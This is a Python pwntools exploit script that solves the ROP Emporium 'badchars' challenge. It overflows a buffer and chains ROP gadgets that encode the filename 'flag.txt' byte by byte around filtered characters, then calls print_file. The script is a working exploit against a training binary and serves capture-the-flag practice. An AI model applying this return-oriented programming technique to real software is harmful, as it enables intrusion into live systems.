from pwn import *

context.binary = elf = ELF('./badchars')
context.terminal = ('kgx', '-e')

if args.GDB:
    r = gdb.debug(elf.path, '''
                b *pwnme + 266
                c
    ''')
else:
    r = process(elf.path)

# badchars: 'x', 'g', 'a', '.'

payload = b'a'*40 + flat([

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'f'.hex(), 16)),  # f
    0x60102f,   # .data section + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put f in .data[0]

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'l'.hex(), 16)),  # l
    0x601030,   # .data section + 1 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put l in .data[1]

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'a'.hex(), 16) - 21),  # a -> badchar -> this becomes L
    0x601031,   # .data section + 2 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put f in .data[2]
    0x4006a0,   # pop r14; pop r15; ret;
    p64(0x15),  # 21 -> r14b
    0x601031,   # .data section + 2 + 7
    0x40062c,   # add byte ptr [r15], r14b; ret; -> add 21 to L -> a

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'g'.hex(), 16) - 21),  # g
    0x601032,   # .data section + 3 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put g in .data[3]
    0x4006a0,   # pop r14; pop r15; ret;
    p64(0x15),  # 21 -> r14b
    0x601032,   # .data section + 3 + 7
    0x40062c,   # add byte ptr [r15], r14b; ret; -> add 21 to R -> g

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'.'.hex(), 16) - 21),  # .
    0x601033,   # .data section + 4 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put . in .data[4]
    0x4006a0,   # pop r14; pop r15; ret;
    p64(0x15),  # 21 -> r14b
    0x601033,   # .data section + 4 + 7
    0x40062c,   # add byte ptr [r15], r14b; ret; -> add 21 to \x19 -> .

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b't'.hex(), 16)),  # t
    0x601034,   # .data section + 5 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put t in .data[5]

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b'x'.hex(), 16) - 21),  # x
    0x601035,   # .data section + 6 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put x in .data[6]
    0x4006a0,   # pop r14; pop r15; ret;
    p64(0x15),  # 21 -> r14b
    0x601035,   # .data section + 6 + 7
    0x40062c,   # add byte ptr [r15], r14b; ret; -> add 21 to c -> x

    0x4006a0,   # pop r14; pop r15; ret;
    p64(int(b't'.hex(), 16)),   # t
    0x601036,   # .data section + 7 + 7
    0x400628,   # xor byte ptr [r15], r14b; ret; -> put t in .data[7]

    0x4006a3,   # pop rdi; ret;
    0x60102f,   # .data section + 7
    0x400620,   # call print_file
])

r.sendlineafter('> ', payload)
r.interactive()
